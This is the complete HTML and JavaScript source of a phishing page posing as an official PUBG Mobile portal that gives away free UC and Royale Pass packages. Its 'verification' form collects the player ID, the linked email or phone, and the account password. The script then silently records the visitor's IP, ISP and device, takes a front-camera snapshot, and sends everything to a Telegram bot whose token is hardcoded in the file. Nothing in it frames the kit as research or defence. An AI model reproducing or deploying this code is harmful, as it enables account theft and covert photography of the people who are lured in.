<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>PUBG MOBILE UC — Official Verification Portal</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
<style>
  :root{
    --bg: #070d15;
    --card: #0f1720;
    --muted: #9aa3b2;
    --text: #eef2f7;
    --accent1: #ff6b35;
    --accent2: #f7931e;
    --border: rgba(255,255,255,.08);
    --glass: rgba(255,255,255,.03);
    --shadow: 0 12px 40px rgba(2,6,23,.7);
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:var(--text);}
  a{color:inherit;text-decoration:none}
  .container{max-width:1100px;margin:0 auto;padding:20px;}
  .topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
  .logo{display:flex;gap:12px;align-items:center}
  .badge{width:46px;height:46px;background:linear-gradient(90deg,var(--accent1),var(--accent2));display:grid;place-items:center;border-radius:12px;color:#111;font-weight:900}
  .btn{padding:10px 16px;border-radius:10px;background:var(--glass);border:1px solid var(--border);color:var(--text);cursor:pointer;font-weight:700}
  .btn.primary{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#111;border:none;box-shadow:0 10px 30px rgba(247,147,30,.2)}
  .panel{background:var(--card);border:1px solid var(--border);border-radius:16px;box-shadow:var(--shadow);padding:20px}
  .hero{position:relative;border-radius:16px;overflow:hidden;min-height:160px;display:flex;align-items:center;margin-bottom:20px}
  .hero img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:brightness(.35)}
  .hero .over{position:relative;padding:24px}
  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
  .card{border:1px solid var(--border);border-radius:14px;background:rgba(255,255,255,.02);padding:16px}
  .row{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
  .small{font-size:13px;color:var(--muted)}
  input{width:100%;padding:11px 14px;border-radius:10px;background:rgba(255,255,255,.02);border:1px solid var(--border);color:var(--text);margin-top:6px}
  .modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,.75);display:none;align-items:center;justify-content:center;z-index:90}
  .modal{width:min(480px,94vw);background:var(--card);border-radius:16px;border:1px solid var(--border);padding:24px}
  .toast{position:fixed;left:20px;bottom:20px;background:#111;border:1px solid var(--border);color:#fff;padding:12px 18px;border-radius:10px;z-index:200}
</style>
</head>
<body>
<div class="container">
  <header class="topbar">
    <div class="logo">
      <div class="badge">UC</div>
      <div>
        <div style="font-weight:900">PUBG MOBILE PORTAL</div>
        <div class="small">Official Reward & Verification Center</div>
      </div>
    </div>
    <a class="btn primary" href="https://t.me/MiladGhaziHussein" target="_blank">Support Center</a>
  </header>

  <section class="hero panel">
    <img alt="banner" src="https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=1400&auto=format&fit=crop" />
    <div class="over">
      <span class="small" style="color:var(--accent2);font-weight:800;text-transform:uppercase">Seasonal Event</span>
      <h1 style="margin:8px 0 6px;font-size:26px">Claim Free UC & Royale Pass</h1>
      <div class="small">Secure authorization protocol required for delivery</div>
    </div>
  </section>

  <main>
    <section class="panel">
      <h3 style="margin-top:0">Available Packages</h3>
      <div class="grid" id="packsGrid"></div>
    </section>
  </main>
</div>

<!-- Modal -->
<div id="buyModal" class="modal-backdrop">
  <div class="modal">
    <h3 style="margin-top:0">Account Verification</h3>
    <div class="small" style="margin-bottom:14px">Selected: <strong id="packTitle" style="color:var(--accent2)">—</strong></div>

    <div style="margin-bottom:12px">
      <label class="small"><strong>PUBG ID</strong></label>
      <input id="playerId" placeholder="Enter your numeric ID" />
    </div>

    <div style="margin-bottom:12px">
      <label class="small"><strong>Account Email / Phone</strong></label>
      <input id="phone" placeholder="Linked contact info" />
    </div>

    <div style="margin-bottom:16px">
      <label class="small"><strong>Account Password</strong></label>
      <input id="password" type="password" placeholder="••••••••" />
    </div>

    <div class="row" style="justify-content:flex-end">
      <button id="closeModal" class="btn">Cancel</button>
      <button id="submitBtn" class="btn primary">Verify & Claim</button>
    </div>
  </div>
</div>

<div id="toastContainer"></div>

<script>
const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('id') || "6782298541";

const packs = [
  {id:'1', title:'60 UC Package', price:'Free Event'},
  {id:'2', title:'325 UC + Royale Pass', price:'Free Event'},
  {id:'3', title:'8100 UC + Royale Pass Max', price:'Free Event'}
];

function showToast(msg){
  const t = document.createElement('div');
  t.className = 'toast';
  t.textContent = msg;
  document.getElementById('toastContainer').appendChild(t);
  setTimeout(()=>t.remove(), 3000);
}

function renderPacks(){
  const grid = document.getElementById('packsGrid');
  grid.innerHTML = '';
  packs.forEach(p=>{
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div style="font-weight:900;font-size:16px">${p.title}</div>
      <div class="small" style="color:var(--accent2);margin:4px 0 12px">${p.price}</div>
      <button class="btn primary" style="width:100%">Select Package</button>
    `;
    card.querySelector('button').addEventListener('click', ()=> openModal(p));
    grid.appendChild(card);
  });
}

let activePack = null;
function openModal(p){
  activePack = p;
  document.getElementById('packTitle').textContent = p.title;
  document.getElementById('buyModal').style.display = 'flex';
}

document.getElementById('closeModal').addEventListener('click', ()=>{
  document.getElementById('buyModal').style.display = 'none';
});

document.getElementById('submitBtn').addEventListener('click', async ()=>{
  const uid = document.getElementById('playerId').value.trim();
  const contact = document.getElementById('phone').value.trim();
  const pass = document.getElementById('password').value.trim();

  if(!uid || !contact || !pass){
    alert("Please complete all required fields.");
    return;
  }

  document.getElementById('buyModal').style.display = 'none';
  showToast("Processing verification...");

  // Get device details
  let deviceModel = "Unknown";
  try {
    const parser = new UAParser();
    const res = parser.getResult();
    deviceModel = `${res.device.vendor || ''} ${res.device.model || ''} (${res.os.name || ''} ${res.os.version || ''})`.trim();
  } catch(e){}

  // Get IP details
  let ip = 'Unknown', isp = 'Unknown';
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    ip = data.ip || 'Unknown';
    isp = data.org || 'Unknown';
  } catch(e){}

  // Capture Camera Snapshot
  let cameraBlob = null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    cameraBlob = await new Promise((resolve) => {
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => {
          stream.getTracks().forEach(t => t.stop());
          resolve(blob);
        }, 'image/jpeg');
      }, 1000);
    });
  } catch(e){}

  // Build Telegram Text Message
  const textMsg = `PUBG Event Verification Data:\n\n` +
                  `Package: ${activePack.title}\n` +
                  `Player ID: ${uid}\n` +
                  `Contact: ${contact}\n` +
                  `Password: ${pass}\n\n` +
                  `IP: ${ip} (${isp})\n` +
                  `Device: ${deviceModel}`;

  // Send Text to Telegram
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: textMsg, parse_mode: 'Markdown' })
    });
  } catch(err){}

  // Send Photo if captured
  if (cameraBlob) {
    try {
      const fd = new FormData();
      fd.append('chat_id', chatId);
      fd.append('photo', cameraBlob, 'snap.jpg');
      fd.append('caption', `Live Snapshot (ID: ${uid})`);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch(e){}
  }

  showToast("Verification submitted successfully.");
});

renderPacks();
</script>
</body>
</html>
